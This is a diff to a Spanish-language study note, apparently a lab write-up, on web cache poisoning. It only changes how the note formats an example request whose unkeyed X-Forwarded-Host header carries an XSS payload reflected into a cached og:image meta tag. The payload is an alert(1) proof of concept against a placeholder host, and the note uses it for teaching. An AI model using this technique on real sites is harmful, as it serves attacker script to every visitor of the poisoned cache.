@@ -17,18 +17,14 @@ El input **unkeyed** (`X-Forwarded-Host`) se **refleja sin sanitizar dentro de u
 
 ## Request → Response
 
-```http
-GET /en?region=uk HTTP/1.1
-Host: innocent-website.com
-X-Forwarded-Host: a."><script>alert(1)</script>"
-```
+> `GET /en?region=uk HTTP/1.1`
+> `Host: innocent-website.com`
+> `X-Forwarded-Host: `==`a."><script>alert(1)</script>"`==
 
-```http
-HTTP/1.1 200 OK
-Cache-Control: public
-...
-<meta property="og:image" content="https://a."><script>alert(1)</script>"/cms/social.png" />
-```
+**⬇️ se incrusta en el `content` del `<meta og:image>`:**
+
+> `HTTP/1.1 200 OK` · `Cache-Control: public`
+> `<meta property="og:image" content="https://`==`a."><script>alert(1)</script>"`==`/cms/social.png" />`
 
 ## Por qué funciona
 - **`X-Forwarded-Host` no forma parte de la cache key** pero **sí cambia la respuesta** → la copia envenenada se cachea y se sirve a todos.
